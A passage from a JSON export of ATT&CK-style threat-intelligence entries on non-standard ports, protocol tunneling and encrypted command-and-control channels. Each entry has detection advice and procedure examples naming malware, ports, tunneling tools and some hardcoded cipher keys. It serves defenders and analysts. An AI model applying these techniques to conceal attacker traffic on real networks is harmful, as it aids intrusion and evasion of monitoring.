      "Stuxnetuses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.[44]",
      "TurlaRPC backdoors can be used to transfer files to/from victim machines on the local network.[45][46]",
      "Velvet Anttransferred files laterally within victim networks through theImpackettoolkit.[30]",
      "Volt Typhoonhas copied web shells between servers in targeted environments.[47]",
      "WannaCryattempts to copy itself to remote computers after gaining access via an SMB exploit.[48]",
      "Wizard Spiderhas used stolen credentials to copy tools into the%TEMP%directory of domain controllers.[49]"
    ]
  },
  "T1571": {
    "Name": "Non-Standard Port",
    "Description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088[1]or port 587[2]as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.[3]",
    "Detects": [
      "Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.",
      "Monitor network data flows for unexpected patterns and metadata that may be indicative of a mismatch between protocol and utilized port."
    ],
    "Procedure Examples": [
      "APT-C-36has used port 4050 for C2 communications.[4]",
      "AnAPT32backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.[5]",
      "APT33has used HTTP over TCP ports 808 and 880 for command and control.[1]",
      "BADCALLcommunicates on ports 443 and 8000 with a FakeTLS method.[6]",
      "Bankshotbinds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method.[7]",
      "BendyBearhas used a custom RC4 and XOR encrypted protocol over port 443 for C2.[8]",
      "DuringC0018, the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections.[9]",
      "During theC0032campaign,TEMP.Velesused port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.[10]",
      "Covenantlisteners and controllers can be configured to use non-standard ports.[11]",
      "Cyclops Blinkcan use non-standard ports for C2 not typically associated with HTTP or HTTPS traffic.[12]",
      "DarkVishnyaused ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2.[13]",
      "Derusbihas used unencrypted HTTP on port 443 for C2.[14]",
      "Ember Bearhas used various non-standard ports for C2 communication.[15]",
      "Emotethas used HTTP over ports such as 20, 22, 443, 7080, and 50000, in addition to using ports commonly associated with HTTP/S.[16][17]",
      "FIN7has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.[18]",
      "GoldenSpyhas used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files.[19]",
      "GravityRAThas used HTTP over a non-standard port, such as TCP port 46769.[20]",
      "Hannotoguses non-standard listening ports, such as UDP 5900, for command and control purposes.[21]",
      "HARDRAINbinds and listens on port 443 with a FakeTLS method.[22]",
      "HOPLIGHThas connected outbound over TCP port 443 with a FakeTLS method.[23]",
      "DuringIndian Critical Infrastructure Intrusions,RedEchoused non-standard ports such as TCP 8080 for HTTP communication.[24]",
      "KV Botnet Activitygenerates a random port number greater than 30,000 to serve as the listener for subsequent command and control activity.[25]",
      "SomeLazarus Groupmalware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.[26][27]",
      "MacMahas used TCP port 5633 for C2 Communication.[28]",
      "Magic Houndmalware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP.[29][30]",
      "Metamorfohas communicated with hosts over raw TCP on port 9999.[31]",
      "MoonWindcommunicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.[32]",
      "njRAThas used port 1177 for HTTP C2 communications.[33]",
      "DuringOperation Wocao, the threat actors used uncommon high ports for its backdoor C2, including ports 25667 and 47000.[34]",
      "OSX_OCEANLOTUS.Dhas used a custom binary protocol over TCP port 443 for C2.[35]",
      "Pikabotuses non-standard ports, such as 2967, 2223, and others, for HTTPS command and control communication.[36]",
      "PingPullcan use HTTPS over port 8080 for C2.[37]",
      "PlugXhas used random, high-number, non-standard ports to listen for subsequent actions and C2 activities.[38]",
      "PoetRATused TLS to encrypt communications over port 143[39]",
      "QuasarRATcan use port 4782 on the compromised host for TCP callbacks.[40]",
      "Raspberry Robinwill communicate via HTTP over port 8080 for command and control traffic.[41]",
      "RedEchohas used non-standard ports such as TCP 8080 for HTTP communication.[24]",
      "RedLeavescan use HTTP over non-standard ports, such as 995, for C2.[42]",
      "Rocke's miner connects to a C2 server using port 51640.[43]",
      "RotaJakirouses a custom binary protocol over TCP port 443.[44]",
      "RTMused Port 44443 for its VNC module.[45]",
      "Sandworm Teamhas used port 6789 to accept connections on the group's SSH server.[46]",
      "Sardonichas the ability to connect with actor-controlled C2 servers using a custom binary protocol over port 443.[47]",
      "Silencehas used port 444 when sending data about the system from the client to the server.[48]",
      "StrongPityhas used HTTPS over port 1402 in C2 communication.[49]",
      "SUGARUSHhas used port 4585 for a TCP connection to its C2.[50]",
      "SomeTrickBotsamples have used HTTP over ports 447 and 8082 for C2.[51][52][53]Newer versions ofTrickBothave been known to use a custom communication protocol which sends the data unencrypted over port 443.[54]",
      "TYPEFRAMEhas used ports 443, 8080, and 8443 with a FakeTLS method.[55]",
      "Velvet Anthas used random high number ports forPlugXlisteners on victim devices.[38]",
      "WellMailhas been observed using TCP port 25, without using SMTP, to leverage an open port for secure command and control communications.[56][57]",
      "WIRTEhas used HTTPS over ports 2083 and 2087 for C2.[58]",
      "ZxShellcan use ports 1985 and 1986 in HTTP/S communication.[59]"
    ]
  },
  "T1572": {
    "Name": "Protocol Tunneling",
    "Description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.[1][2]Protocol Tunnelingmay also be abused by adversaries duringDynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.[3]Adversaries may also leverageProtocol Tunnelingin conjunction withProxyand/orProtocol or Service Impersonationto further conceal C2 communications and infrastructure.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamdeployed the GOGETTER tunneler software to establish a \"Yamux\" TLS-based C2 channel with an external server(s).[4]",
      "Brute Ratel C4can use DNS over HTTPS for C2.[5][6]",
      "DuringC0027,Scattered Spiderused SSH tunneling in targeted environments.[7]",
      "During theC0032campaign,TEMP.Velesused encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment.[8]",
      "Chimerahas encapsulatedCobalt Strike's C2 protocol in DNS and HTTPS.[9]",
      "Cinnamon Tempesthas used the Iox and NPS proxy and tunneling tools in combination  create multiple connections through a single tunnel.[10]",
      "Cobalt Grouphas used the Plink utility to create SSH tunnels.[11][12][13]",
      "Cobalt Strikeuses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.[14][15]",
      "DuringCostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.[16]",
      "DuringCutting Edge, threat actors used Iodine to tunnel IPv4 traffic over DNS.[17]",
      "Cyclops Blinkcan use DNS over HTTPS (DoH) to resolve C2 nodes.[18]",
      "Duquuses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.[19]",
      "Ember Bearhas used ProxyChains to tunnel protocols to internal networks.[20]",
      "FIN13has utilized web shells and Java tools for tunneling capabilities to and from compromised assets.[21]",
      "FIN6used the Plink command-line utility to create SSH tunnels to C2 servers.[22]",
      "FLIPSIDEuses RDP to tunnel traffic from a victim environment.[23]",
      "Fox Kittenhas used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such asngrokand custom tool SSHMinion.[24][25][26]",
      "FRPcan tunnel SSH and Unix Domain Socket communications over TCP between external nodes and exposed resources behind firewalls or NAT.[27]",
      "FunnyDreamcan connect to HTTP proxies via TCP to create a tunnel to C2.[28]",
      "Heyoka Backdoorcan use spoofed DNS requests to create a bidirectional tunnel between a compromised host and its C2 servers.[29]",
      "Industroyerattempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.[30]",
      "Kevincan use a custom protocol tunneled through DNS or HTTP.[31]",
      "Leviathanhas used protocol tunneling to further conceal C2 communications and infrastructure.[32]",
      "LunarWebcan run a custom binary protocol under HTTPS for C2.[33]",
      "Magic Houndhas used Plink to tunnel RDP over SSH.[34]",
      "Milancan use a custom protocol tunneled through DNS or HTTP.[31]",
      "Mythiccan use SOCKS proxies to tunnel traffic through another protocol.[35]",
      "Neo-reGeorgcan tunnel data in and out of targeted networks.[36]",
      "ngrokcan tunnel RDP and other services securely over internet connections.[37][38][39][40]",
      "OilRighas used the Plink utility and other tools to create tunnels to C2 servers.[41][42][43][44]",
      "TheQakBotproxy module can encapsulate SOCKS5 protocol within its own proxy protocol.[45]",
      "reGeorgcan tunnel TCP sessions including RDP, SSH, and SMB through HTTP.[46][47][48]",
      "Salt Typhoonhas modified device configurations to create and use Generic Routing Encapsulation (GRE) tunnels.[49]",
      "Uroburoshas the ability to communicate over custom communications methodologies that ride over common network protocols including raw TCP and UDP sockets, HTTP, SMTP, and DNS.[50]"
    ]
  },
  "T1573": {
    "Name": "Encrypted Channel",
    "Description": "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "APT29has used multiple layers of encryption within malware to protect C2 communication.[1]",
      "BITTERhas encrypted their C2 communications.[2]",
      "Chaeshas used encryption for its C2 channel.[3]",
      "Cryptoisticcan engage in encrypted communications with C2.[4]",
      "Emotethas encrypted data before sending to the C2 server.[5]",
      "gh0st RAThas encrypted TCP communications to evade detection.[6]",
      "Gomiruses a custom encryption algorithm for content sent to command and control infrastructure.[7]",
      "KV Botnet Activitycommand and control activity includes transmission of an RSA public key in communication from the server, but this is followed by subsequent negotiation stages that represent a form of handshake similar to TLS negotiation.[8]",
      "Lizarcan support encrypted communications between the client and server.[9][10]",
      "MacMahas used TLS encryption to initialize a custom protocol for C2 communications.[11]",
      "Magic Houndhas used an encrypted http proxy in C2 communications.[12]",
      "NETWIREcan encrypt C2 communications.[13]",
      "PowerLesscan use an encrypted channel for C2 communications.[14]",
      "PowGoopcan receive encrypted commands from C2.[15]",
      "RCSessioncan use an encrypted beacon to check in with C2.[16]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velesused cryptcat binaries to encrypt their traffic.[17]",
      "Tropic Trooperhas encrypted traffic with the C2 to prevent network detection.[18]"
    ]
  },
  "T1573.001": {
    "Name": "Encrypted Channel:Symmetric Cryptography",
    "Description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "3PARA RATcommand and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.3PARA RATwill use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS if the DES decoding fails[1]",
      "4H RATobfuscates C2 communication using a 1-byte XOR with the key 0xBE.[1]",
      "A variant ofADVSTORESHELLencrypts some C2 with 3DES.[2]",
      "APT28installed a Delphi backdoor that used a custom algorithm for C2 communications.[3]",
      "APT33has used AES for encryption of command and control traffic.[4]",
      "Attorhas encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.[5]",
      "Azorultcan encrypt C2 traffic using XOR.[6][7]",
      "BADCALLencrypts C2 traffic using an XOR/ADD cipher.[8]",
      "BADNEWSencrypts C2 data with a ROR by 3 and an XOR by 0x23.[9][10]",
      "Bandookhas used AES encryption for C2 communication.[11]",
      "Bazarcan send C2 communications with XOR encryption.[12]",
      "BBSRATuses a custom encryption algorithm on data sent back to the C2 server over HTTP.[13]",
      "BendyBearcommunicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks.[14]",
      "Bisonalvariants reported on in 2014 and 2015 used a simple XOR cipher for C2. SomeBisonalsamples encrypt C2 communications with RC4.[15][16][17]",
      "BLINDINGCANhas encrypted its C2 traffic with RC4.[18]",
      "Bonadancan XOR-encrypt C2 communications.[19]",
      "BRONZE BUTLERhas used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic.BRONZE BUTLERhas also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.[20]",
      "Bumblebeecan encrypt C2 requests and responses with RC4[21]",
      "CallMeuses AES to encrypt C2 traffic.[22]",
      "Carbanakencrypts the message body of HTTP traffic with RC2 (in CBC mode).Carbanakalso uses XOR with random keys for its communications.[23][24]",
      "Cardinal RATuses a secret key with a series of XOR and addition operations to encrypt C2 traffic.[25]",
      "Chaosprovides a reverse shell connection on 8338/TCP, encrypted via AES.[26]",
      "CharmPowercan send additional modules over C2 encrypted with a simple substitution cipher.[27]",
      "ChChescan encrypt C2 traffic with AES or RC4.[28][29]",
      "CHOPSTICKencrypts C2 communications with RC4.[30]",
      "Cobalt Strikehas the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.[31]",
      "Comnieencrypts command and control communications with RC4.[32]",
      "CORESHELLC2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.[33]",
      "CosmicDukecontains a custom version of the RC4 algorithm that includes a programming error.[34]",
      "Darkhotelhas used AES-256 and 3DES for C2 communications.[35]",
      "Daserfuses RC4 encryption to obfuscate HTTP traffic.[20]",
      "Derusbiobfuscates C2 traffic with variable 4-byte XOR keys.[36]",
      "Dipsindencrypts C2 data with AES256 in ECB mode.[37]",
      "down_newhas the ability to AES encrypt C2 communications.[38]",
      "Downdelphuses RC4 to encrypt C2 responses.[39]",
      "Dridexhas encrypted traffic with RC4.[40]",
      "TheDuqucommand and control protocol's data stream can be encrypted with AES-CBC.[41]",
      "Eburyhas encrypted C2 traffic using the client IP address, then encoded it as a hexadecimal string.[42]",
      "Eliseencrypts exfiltrated data with RC4.[43]",
      "The C2 server response to a beacon sent by a variant ofEmissarycontains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants ofEmissaryuse various XOR operations to encrypt C2 data.[44]",
      "Emotetis known to use RSA keys for encrypting C2 traffic.[45]",
      "Epicencrypts commands from the C2 server using a hardcoded key.[46]",
      "Explosivehas encrypted communications with the RC4 method.[47]",
      "The original variant ofFakeMencrypts C2 traffic using a custom encryption cipher that uses an XOR key of \"YHCRA\" and bit rotation between each XOR operation. Some variants ofFakeMuse RC4 to encrypt C2 traffic.[22]",
      "FALLCHILLencrypts C2 data with RC4 encryption.[48][49]",
      "FatDukecan AES encrypt C2 communications.[50]",
      "SomeFelismussamples use a custom encryption method for C2 traffic that utilizes AES and multiple keys.[51]",
      "FlawedAmmyyhas used SEAL encryption during the initial C2 handshake.[52]",
      "FoggyWebhas used a dynamic XOR key and custom XOR methodology for C2 communications.[53]",
      "DuringFrankenstein, the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC.[54]",
      "FRPcan use STCP (Secret TCP) with a preshared key to encrypt services exposed to public networks.[55]",
      "Gazeruses custom encryption for C2 that uses 3DES.[56][57]",
      "gh0st RATuses RC4 and XOR to encrypt C2 traffic.[58]",
      "GreyEnergyencrypts communications using AES256.[59]",
      "GrimAgentcan use an AES key to encrypt C2 communications.[60]",
      "H1N1encrypts C2 traffic using an RC4 key.[61]",
      "Before being appended to image files,HAMMERTOSScommands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.[62]",
      "Helminthencrypts data sent to its C2 server over HTTP with RC4.[63]",
      "Hi-Zorencrypts C2 traffic with a double XOR using two distinct single-byte keys.[64]",
      "HiddenWaspuses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication.[65]",
      "Higaisaused AES-128 to encrypt C2 traffic.[66]",
      "Hikitperforms XOR encryption.[67]",
      "HotCroissanthas compressed network communications and encrypted them with a custom stream cipher.[68][69]",
      "httpclientencrypts C2 content with XOR using a single byte, 0x12.[1]",
      "HydraqC2 traffic is encrypted using bitwise NOT and XOR operations.[70]",
      "HyperStackhas used RSA encryption for C2 communications.[71]",
      "TheIceAppleResult Retriever module can AES encrypt C2 responses.[72]",
      "Inceptionhas encrypted network communications with AES.[73]",
      "InvisiMoleuses variations of a simple XOR encryption routine for C&C communications.[74]",
      "KEYMARBLEuses a customized XOR algorithm to encrypt C2 communications.[75]",
      "Kobalos's post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic.[76][77]",
      "TheKomplexC2 channel uses an 11-byte XOR algorithm to hide data.[78]",
      "KONNIhas used AES to encrypt C2 traffic.[79]",
      "Latrodectuscan send RC4 encrypted data over C2 channels.[80][81][82]",
      "SeveralLazarus Groupmalware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. AnotherLazarus Groupmalware sample XORs C2 traffic. OtherLazarus Groupmalware uses Caracachs encryption to encrypt C2 payloads.Lazarus Grouphas also used AES to encrypt C2 traffic.[83][84][85][86]",
      "LightNeuronuses AES to encrypt C2 traffic.[87]",
      "LIGHTWIREcan RC4 encrypt C2 commands.[88]",
      "LockBit 3.0can encrypt C2 communications with AES.[89]",
      "LookBackuses a modified version of RC4 for data transfer.[90]",
      "Lucifercan perform a decremental-xor encryption on the initial C2 request before sending it over the wire.[91]",
      "LunarWebcan send AES encrypted C2 commands.[92]",
      "Luridperforms XOR encryption.[93]",
      "Machetehas used AES to exfiltrate documents.[94]",
      "Mafaldacan encrypt its C2 traffic with RC4.[95]",
      "Mangocan receive XOR-encrypted commands from C2.[96]",
      "metaMaincan encrypt the data that it sends and receives from the C2 server using an RC4 encryption algorithm.[95][97]",
      "Metamorfohas encrypted C2 commands with AES-256.[98]",
      "Mongallhas the ability to RC4 encrypt C2 communications.[99]",
      "MoonWindencrypts C2 traffic using RC4 with a static key.[100]",
      "More_eggshas used an RC4-based encryption method for its C2 communications.[101]",
      "Mosquitouses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.[102]",
      "MuddyWaterhas used AES to encrypt C2 responses.[103]",
      "Mustang Pandahas encrypted C2 communications with RC4.[104]",
      "NanoCoreuses DES to encrypt the C2 traffic.[105]",
      "NDiskMonitoruses AES to encrypt certain information sent over its C2 channel.[10]",
      "Nebulaecan use RC4 and XOR to encrypt C2 communications.[106]",
      "NETEAGLEwill decrypt resources it downloads with HTTP requests by using RC4 with the key \"ScoutEagle.\"[107]",
      "NETWIREcan use AES encryption for C2 data transferred.[108]",
      "NGLitewill use an AES encrypted channel for command and control purposes, in one case using the keyWHATswrongwithUu.[109]",
      "Ninjacan XOR and AES encrypt C2 messages.[110]",
      "Okrumuses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase.[111]",
      "DuringOperation Dream Job,Lazarus Groupused an AES key to communicate with their C2 server.[112]",
      "OSX_OCEANLOTUS.Dencrypts data sent back to the C2 using AES in CBC mode with a null initialization vector (IV) and a key sent from the server that is padded to 32 bytes.[113]",
      "Pandorahas the ability to encrypt communications with D3DES.[114]",
      "EarlierPikabotvariants use a custom encryption procedure leveraging multiple mechanisms including AES with multiple rounds of Base64 encoding for its command and control communication.[115]LaterPikabotvariants eliminate the use of AES and instead use RC4 encryption for transmitted information.[116]",
      "PingPullcan use AES, in cipher block chaining (CBC) mode padded with PKCS5, to encrypt C2 server communications.[117]",
      "PipeMoncommunications are RC4 encrypted.[118]",
      "PLAINTEEencodes C2 beacons using XOR.[119]",
      "PLEADhas used RC4 encryption to download modules.[120]",
      "PlugXcan use RC4 encryption in C2 communications.[121]",
      "PoisonIvyuses the Camellia cipher to encrypt communications.[122]",
      "POWERTONhas used AES for encrypting C2 traffic.[4]",
      "Prikormkaencrypts some C2 traffic with the Blowfish cipher.[123]",
      "QakBotcan RC4 encrypt strings in C2 communication.[124]",
      "QuasarRATuses AES with a hardcoded pre-shared key to encrypt network communication.[125][126][127]",
      "QUIETCANARYcan RC4 encrypt C2 communications.[128]",
      "RainyDaycan use RC4 to encrypt C2 communications.[106]",
      "RDAThas used AES ciphertext to encode C2 communications.[129]",
      "RedCurlhas used AES-128 CBC to encrypt C2 communications.[130]",
      "RedLeaveshas encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.[131]",
      "Rifdoorhas encrypted command and control (C2) communications with a stream cipher.[68]",
      "APT12has used theRIPTIDERAT, which communicates over HTTP with a payload encrypted with RC4.[132]",
      "RotaJakiroencrypts C2 communication using a combination of AES, XOR, ROTATE encryption, and ZLIB compression.[133]",
      "RTMencrypts C2 traffic with a custom RC4 variant.[134]",
      "Sakulaencodes C2 traffic with single-byte XOR keys.[135]",
      "Samuraican encrypt C2 communications with AES.[110]",
      "Sardonichas the ability to use an RC4 key to encrypt communications to and from actor-controlled C2 servers.[136]",
      "SeaDukeC2 traffic has been encrypted with RC4 and AES.[137][138]",
      "SideTwistcan encrypt C2 communications with a randomly generated key.[139]",
      "SLIGHTPULSEcan RC4 encrypt all incoming and outgoing C2 messages.[140]",
      "Slivercan use AES-GCM-256 to encrypt a session key for C2 message exchange.[141]",
      "SMOKEDHAMhas encrypted its C2 traffic with RC4.[142]",
      "SNUGRIDEencrypts C2 traffic using AES with a static key.[143]",
      "SodaMastercan use RC4 to encrypt C2 communications.[144]",
      "Solarcan XOR encrypt C2 communications.[96]",
      "SombRAThas encrypted its C2 communications with AES.[145]",
      "Stealth Falconmalware encrypts C2 traffic using RC4 with a hard-coded key.[146]",
      "StrifeWatercan encrypt C2 traffic using XOR with a hard coded key.[147]",
      "Stuxnetencodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key.Stuxnetalso uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant.[148]",
      "SUNBURSTencrypted C2 traffic using a single-byte-XOR cipher.[149]",
      "Sys10uses an XOR 0x1 loop to encrypt its C2 domain.[150]",
      "SysUpdatehas used DES to encrypt all C2 communications.[151]",
      "Taidooruses RC4 to encrypt the message body of HTTP content.[152][153]",
      "TAINTEDSCRIBEuses a Linear Feedback Shift Register (LFSR) algorithm for network encryption.[154]",
      "TAMECAThas used AES to encrypt C2 traffic.[155]",
      "Torismahas encrypted its C2 communications using XOR and VEST-32.[156]",
      "TrickBotuses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.[157]Newer versions ofTrickBothave been known to usebcryptto encrypt and digitally sign responses to their C2 server.[158]",
      "Troll Stealerencrypts data sent to command and control infrastructure using a combination of RC4 and RSA-4096 algorithms.[159]",
      "TSCookiehas encrypted network communications with RC4.[160]",
      "UBoatRATencrypts instructions in its C2 network payloads using a simple XOR cipher.[161]",
      "Some versions ofUPPERCUThave used the hard-coded string \"this is the encrypt key\" for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.[162]",
      "Uroburoscan encrypt the data beneath its http2 or tcp encryption at the session layer with CAST-128, using a different key for incoming and outgoing data.[163]",
      "Volgmeruses a simple XOR cipher to encrypt traffic and files.[164]",
      "Volt Typhoonhas used a version of the Awen web shell that employed AES encryption and decryption for C2 communications.[165]",
      "WarzoneRATcan encrypt its C2 with RC4 with the passwordwarzone160\\x00.[166]",
      "WellMesscan encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.[167][168][169]",
      "Winnti for Linuxhas used a custom TCP protocol with four-byte XOR for command and control (C2).[170]",
      "Winnti for Windowscan XOR encrypt C2 traffic.[171]",
      "WIREFIREcan AES encrypt process output sent from compromised devices to C2.[172]",
      "Woody RATcan use AES-CBC to encrypt data sent to its C2 server.[173]",
      "xCaonhas encrypted data sent to the C2 server using a XOR key.[174]",
      "XCSSETuses RC4 encryption over TCP to communicate with its C2 server.[175]",
      "ZeroThas used RC4 to encrypt C2 traffic.[176][177]",
      "ZIPLINEcan use AES-128-CBC to encrypt data for both upload and download.[88]",
      "ZIRCONIUMhas used AES encrypted communications in C2.[178]"
    ]
  },
  "T1573.002": {
    "Name": "Encrypted Channel:Asymmetric Cryptography",
    "Description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified asAsymmetric Cryptography.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "adbupdcontains a copy of the OpenSSL library to encrypt C2 traffic.[1]",
      "A variant ofADVSTORESHELLencrypts some C2 with RSA.[2]",
      "APT41 DUSTused HTTPS for command and control.[3]",
      "APT42has used tools such asNICECURLwith command and control communication taking place over HTTPS.[4]",
      "Attor's Blowfish key is encrypted with a public RSA key.[5]",
      "BADHATCHcan beacon to a hardcoded C2 IP address using TLS encryption every 5 minutes.[6]",
      "Bazarcan use TLS in C2 communications.[7]",
      "BISCUITuses SSL for encrypting C2 communications.[8]",
      "BOLDMOVEuses the WolfSSL library to implement SSL encryption for command and control communication.[9]",
      "DuringC0021, the threat actors used SSL via TCP port 443 for C2 communications.[10]",
      "Carbonhas used RSA encryption for C2 communications.[11]",
      "CHOPSTICKencrypts C2 communications with TLS.[12]",
      "COATHANGERconnects to command and control infrastructure using SSL.[13]",
      "Cobalt Grouphas used the Plink utility to create SSH tunnels.[14]",
      "Cobalt Strikecan use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server.[15]",
      "ComRATcan use SSL/TLS encryption for its HTTP-based C2 channel.ComRAThas used public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel.[16][17]",
      "Covenantcan utilize SSL to encrypt command and control traffic.[18]",
      "Cyclops Blinkcan encrypt C2 messages with AES-256-CBC sent underneath TLS. OpenSSL library functions are also used to encrypt each message using a randomly generated key and IV, which are then encrypted using a hard-coded RSA public key.[19]",
      "DarkWatchmancan use TLS to encrypt its C2 channel.[20]",
      "Dokihas used the embedTLS library for network communications.[21]",
      "Dridexhas encrypted traffic with RSA.[22]",
      "Empirecan use TLS to encrypt its C2 channel.[23]",
      "FIN6used the Plink command-line utility to create SSH tunnels to C2 servers.[24]",
      "FIN8has used the Plink utility to tunnel RDP back to C2 infrastructure.[25]",
      "FRPcan be configured to only accept TLS connections.[26]",
      "Gazeruses custom encryption for C2 that uses RSA.[27][28]",
      "GoldMaxhas RSA-encrypted its communication with the C2 server.[29]",
      "Gomiruses reverse proxy functionality that employs SSL to encrypt communications.[30]",
      "Grandoreirocan use SSL in C2 communication.[31]",
      "GreyEnergyencrypts communications using RSA-2048.[32]",
      "GrimAgentcan use a hardcoded server public RSA key to encrypt the first request to C2.[33]",
      "Hi-Zorencrypts C2 traffic with TLS.[34]",
      "IcedIDhas used SSL and TLS in communications with C2.[35][36]",
      "DuringIndian Critical Infrastructure Intrusions,RedEchoused SSL for network communication.[37]",
      "J-magiccan communicate back to send a challenge to C2 infrastructure over SSL.[38]",
      "KEYPLUGcan use TLS-encrypted WebSocket Protocol (WSS) for C2.[39]",
      "Koadiccan use SSL and TLS for communications.[40]",
      "Kobalos's authentication and key exchange is performed using RSA-512.[41][42]",
      "LITTLELAMB.WOOLTEAcan communicate over SSL using the private key from the Ivanti Connect Secure web server.[43]",
